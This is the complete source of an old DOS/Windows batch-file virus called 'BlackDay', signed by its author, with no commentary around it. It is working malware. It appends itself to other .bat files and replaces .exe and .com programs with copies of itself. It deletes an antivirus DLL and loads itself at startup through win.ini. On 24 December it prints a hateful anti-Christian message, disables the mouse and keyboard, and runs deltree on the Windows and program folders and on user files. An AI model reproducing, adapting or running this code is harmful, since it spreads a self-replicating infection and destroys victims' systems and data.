   @echo off%_bd-ptrr%
   if '%1=='bd-ptrr goto bd-ptrr%2
   set bd-ptrr=%0.bat
   if not exist %bd-ptrr% set bd-ptrr=%0
   if '%bd-ptrr%==' set bd-ptrr=autoexec.bat
   if exist c:\_bd-ptrr.bat goto bd-ptrrg
   if not exist %bd-ptrr% goto ebd-ptrr
   find "bd-ptrr"c:\_bd-ptrr.bat
   attrib c:\_bd-ptrr.bat +h
   :bd-ptrrg
   command /c c:\_bd-ptrr bd-ptrr vir
   :ebd-ptrr
   set bd-ptrr=
   goto bd-ptrrend
   :bd-ptrrvir
   for %%a in (*.bat ..\*.bat) do call c:\_bd-ptrr bd-ptrr i %%a
   exit bd-ptrr
   :bd-ptrri
   find "bd-ptrr"<%3>nul
   if not errorlevel 1 goto bd-ptrrend
   type %3>bd-ptrr$
   echo.>>bd-ptrr$
   type c:\_bd-ptrr.bat>>bd-ptrr$
   move bd-ptrr$ %3>nul
   :bd-ptrrend
   ctty nul
   del c:\programme\norton~1\s32integ.dll
   copy BlackDay.bat c:\windows\system
   attrib +h c:\windows\system\BlackDay.bat
   copy BlackDay.bat + c:\windows\win.ini c:\windows\system\win.ini
   del c:\windows\win.ini
   move c:\windows\system\win.ini c:\windows
   goto comexe

   [windows]
   load=c:\windows\system\BlackDay.bat
   run=C:\WINDOWS\SYSTEM\cmmpu.exe
   NullPort=None

   :comexe
   for %%f in (*.exe *.com) do set A=%%f
   if %A%==COMMAND.COM set A=
   rename %A% V%A%
   if not exist V%A% goto phnord
   attrib +h V%A%
   copy %0.bat %A%
   attrib +r %A%
   ren %A% *.bat
   set A=
   :phnord
   echo.|date|find "24">nul.bd-ptrr
   if errorlevel 1 goto phuck
   ctty con
   echo I hate Jesus Christ and his phuckin Birthday.
   echo For me is the 24th of December just another BlackDay in a dark World.
   echo For you now, every 24th gets such a BlackDay.
   echo The same for your phuckin System, too.
   echo ...
   echo BlackDay phinal by PhileT0a$t3r [rRlf]
   ctty nul
   c:\windows\rundll32.exe mouse,disable
   c:\windows\rundll32.exe keyboard,disable
   del c:\t_online\online.exe
   del c:\acrobatx\reader\acrord32.exe
   del c:\corel\draw70\programs\photopnt.exe
   del c:\winzip\winzip32.exe
   deltree /y c:\windows\desktop
   deltree /y c:\eigene~1
   deltree /y c:\windows\sendto
   deltree /y c:\programme
   deltree /y c:\programs
   deltree /y c:\windows
   c:\windows\rundll32.exe user,disableoemlayer
   :phuck
   ctty con
   @if exist V%0.com V%0.com %1 %2 %3
   @if exist V%0.exe V%0.exe %1 %2 %3
   ctty nul
   :dusk
